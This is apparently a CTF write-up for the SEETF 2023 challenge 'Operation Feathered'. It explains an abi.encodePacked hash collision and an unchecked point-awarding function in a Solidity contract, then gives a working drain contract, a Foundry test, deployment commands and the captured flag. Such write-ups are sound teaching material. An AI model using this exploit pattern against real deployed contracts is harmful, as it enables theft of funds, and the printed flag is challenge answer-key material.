# SEETF 2023 - Operation Feathered [14 solves / 486 points]

### Description
```
In the dystopian digital landscape of the near future, a cunning mastermind has kickstarted his plan for ultimate dominance by creating an army of robotic pigeons. These pigeons, six in the beginning, are given a sinister mission: to spy on the public, their focus being on individuals amassing significant Ethereum (ETH) holdings.

Each pigeon has been tasked with documenting the ETH each person owns, planning for a future operation to swoop in and siphon off these digital assets. The robotic pigeons, however, are not just spies, but also consumers. They are provided with ETH by their creator to cover their operational expenses, making the network of spy birds self-sustaining and increasingly dangerous.

The army operates on a merit-based system, where the pigeon agents earn points for their successful missions. These points pave their path towards promotion, allowing them to ascend the ranks of the robotic army. But, the journey up isn't free. They must return the earned ETH back to their master for their promotion.

Despite the regimented system, the robotic pigeons have a choice. They can choose to desert the army at any point, taking with them the ETH they've earned. Will they remain loyal, or will they break free?

nc win.the.seetf.sg 8548
```

Our goal is to drain the pigeon contract and get its ether
```solidity
    function isSolved() external view returns (bool) {
        return address(msg.sender).balance >= 34 ether && address(pigeon).balance == 0 ether;
    }
```

In Setup.sol, it assigned 6 pigeons, 2 for each rank
```
        // Junior Pigeons
        pigeon.assignPigeon("Numbuh", "6", address(0x006), 0);
        pigeon.assignPigeon{value: 5e18}("Numbuh", "5", address(0x005), 0);

        pigeon.assignPigeon("Numbuh", "4", address(0x004), 1);
        pigeon.assignPigeon{value: 10e18}("Numbuh", "3", address(0x003), 1);

        pigeon.assignPigeon("Numbuh", "2", address(0x002), 2);
        pigeon.assignPigeon{value: 15e18}("Numbuh", "1", address(0x001), 2);
```

Also it sent 30 ether to the pigeon contract in total, and we have 5 ether initially

Anyone can become a pigeon with this function
```solidity
    function becomeAPigeon(string memory code, string memory name) public returns (bytes32 codeName) {
        codeName = keccak256(abi.encodePacked(code, name));

        if (codeToName[code][name]) revert();
        if (isPigeon[msg.sender]) revert();

        juniorPigeon[codeName] = msg.sender;
        isPigeon[msg.sender] = true;
        codeToName[code][name] = true;

        return codeName;
    }
```

It will first check if codeToName is true, if the code and name exist, it reverts

Then it will set `juniorPigeon[codeName]` to the caller address, however codeName is calculated by getting keccak256 hash of the abi.encodePacked of code and name

This is vulnerable to hash collision, as code and name is combined to be hashed, and in `codeToName` code and name are stored separately

With this, we can overwrite the address of a junior pigeon to us

For example this pigeon :
```solidity
pigeon.assignPigeon{value: 5e18}("Numbuh", "5", address(0x005), 0);
```

The code of it is `Numbuh` and name is `5`, abi.encodePacked result will be `Numbuh5`, we can just set code as `Numbuh5` and name as empty string, and the abi.encodePacked result will be the same, but it will be using different slow in `codeToName`, so we can overwrite the address of it

When assigning this pigeon, setup contract sent 5 ether to it, so we can call flyAway to drain that 5 ether

```solidity
    function flyAway(bytes32 codeName, uint256 rank) public oneOfUs {
        uint256 bag = treasury[codeName];
        treasury[codeName] = 0;

        if (rank == 0) {
            if (taskPoints[codeName] > juniorPromotion) revert();

            (bool success,) = juniorPigeon[codeName].call{value: bag}("");
            require(success, "Transfer failed.");
        }
        if (rank == 1) {
            if (taskPoints[codeName] > associatePromotion) revert();

            (bool success,) = associatePigeon[codeName].call{value: bag}("");
            require(success, "Transfer failed.");
        }
        if (rank == 2) {
            (bool success,) = seniorPigeon[codeName].call{value: bag}("");
            require(success, "Transfer failed.");
        }
    }
```

Then for an associate pigeon like this
```solidity
pigeon.assignPigeon{value: 10e18}("Numbuh", "3", address(0x003), 1);
```

We can call promotion() to promote us from junior pigeon to an associate pigeon
```solidity
    function promotion(bytes32 codeName, uint256 desiredRank, string memory newCode, string memory newName)
        public
        oneOfUs
    {
        if (desiredRank == 1) {
            if (msg.sender != juniorPigeon[codeName]) revert();
            if (taskPoints[codeName] < juniorPromotion) revert();
            ownerBalance += treasury[codeName];

            bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName));

            if (codeToName[newCode][newName]) revert();
            associatePigeon[newCodeName] = msg.sender;
            codeToName[newCode][newName] = true;
            taskPoints[codeName] = 0;
            delete juniorPigeon[codeName];

            (bool success,) = owner.call{value: treasury[codeName]}("");
            require(success, "Transfer failed.");
        }

        if (desiredRank == 2) {
            if (msg.sender != associatePigeon[codeName]) revert();
            if (taskPoints[codeName] < associatePromotion) revert();
            ownerBalance += treasury[codeName];

            bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName));

            if (codeToName[newCode][newName]) revert();
            seniorPigeon[newCodeName] = msg.sender;
            codeToName[newCode][newName] = true;
            taskPoints[codeName] = 0;
            delete seniorPigeon[codeName];

            (bool success,) = owner.call{value: treasury[codeName]}("");
            require(success, "Transfer failed.");
        }
    }
```

But in order to promote, we need to reach the taskPoint requirement which is set in the constructor

```soldiity
        juniorPromotion = 8e18;
        associatePromotion = 12e18;
```

To get taskPoint, we can use the task() function
```solidity
    function task(bytes32 codeName, address person, uint256 data) public oneOfUs {
        if (person == address(0)) revert();
        if (isPigeon[person]) revert();
        if (address(person).balance != data) revert();

        uint256 points = data;

        hasBeenCollected[person] = true;
        dataCollection[msg.sender][person] = points;
        taskPoints[codeName] += points;
    }
```

`data` need to be same as the balance of `person`, and it did not check that we are the person, so we can pass any address and the address's balance to it, and taskPoint added will be the balance of that address

So we just need to find an address with lots of ether, which is the pigeon contract itself, then call task() with the codeName of the pigeon that we want the points be added to, and the address of pigeon contract and its balance

Then we will have enough taskPoint for promotion

When we are calling promotion(), we can set a new codename
```solidity
            bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName));

            if (codeToName[newCode][newName]) revert();
            associatePigeon[newCodeName] = msg.sender;
```

So just set it to `Numbuh3` and use the hash collision with abi.encodePacked so it doesn't revert, and it will overwrite the address of the associatePigeon `Numbuh3` to our address

Then just call flyAway() to drain ether

For the senior pigeon it's just the same
```solidity
pigeon.assignPigeon{value: 15e18}("Numbuh", "1", address(0x001), 2);
```

### Exploit contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./Pigeon.sol";

contract PigeonExploit {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function exploit(address _pigeon) public {
        Pigeon pigeon = Pigeon(_pigeon);
        pigeon.becomeAPigeon("Numbuh5", "");
        pigeon.flyAway(keccak256(abi.encodePacked("Numbuh", "5")), 0);
        
        pigeon.task(keccak256(abi.encodePacked("Numbuh", "5")), address(pigeon), address(pigeon).balance);
        pigeon.promotion(keccak256(abi.encodePacked("Numbuh", "5")), 1, "Numbuh3", "");
        pigeon.flyAway(keccak256(abi.encodePacked("Numbuh", "3")), 1);

        pigeon.task(keccak256(abi.encodePacked("Numbuh", "3")), address(pigeon), address(pigeon).balance);
        pigeon.promotion(keccak256(abi.encodePacked("Numbuh", "3")), 2, "Numbuh1", "");
        pigeon.flyAway(keccak256(abi.encodePacked("Numbuh", "1")), 2);
        
        payable(owner).call{value: address(this).balance}("");
    }
    
    receive() external payable {}
}
```

### Foundry test

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/exploit.sol";

contract pigeonTest is Test {
    Setup public setup_contract;
    Pigeon public pigeon;
    address public attacker;
    PigeonExploit public exploit;

    function setUp() public {
        setup_contract = new Setup{value: 30 ether}();
        pigeon = setup_contract.pigeon();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 5 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        
        exploit = new PigeonExploit();
        exploit.exploit(address(pigeon));
                
        console.log(address(attacker).balance);
        console.log(address(pigeon).balance);
        assertTrue(setup_contract.isSolved());
    }
}
```

### Foundry test result

```
# forge test --match-path test/pigeon.t.sol -vv
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/pigeon.t.sol:pigeonTest
[PASS] testExploit() (gas: 643255)
Logs:
  35000000000000000000
  0

Test result: ok. 1 passed; 0 failed; finished in 1.94ms
```

It works, so we can just exploit it on the challenge network

First just deploy the exploit contract

```
# forge create ./src/exploit.sol:PigeonExploit --private-key <key> --rpc-url http://win.the.seetf.sg:8547/aa649f82-733d-4c7d-8249-ed2d3260b326
```

Then just call exploit()

```
# cast send 0x1084241588a63A5BE46508D0D15c0B171Ca3cE36 "exploit(address)" 0xeE3C0A145A766891711F39097fa5A045e0400C08 --rpc-url http://win.the.seetf.sg:8547/aa649f82-733d-4c7d-8249-ed2d3260b326 --private-key <key>
```

```
# nc win.the.seetf.sg 8548
1 - launch new instance
2 - kill instance
3 - acquire flag
action? 3
uuid please: aa649f82-733d-4c7d-8249-ed2d3260b326

Congratulations! You have solve it! Here's the flag: 
SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}
```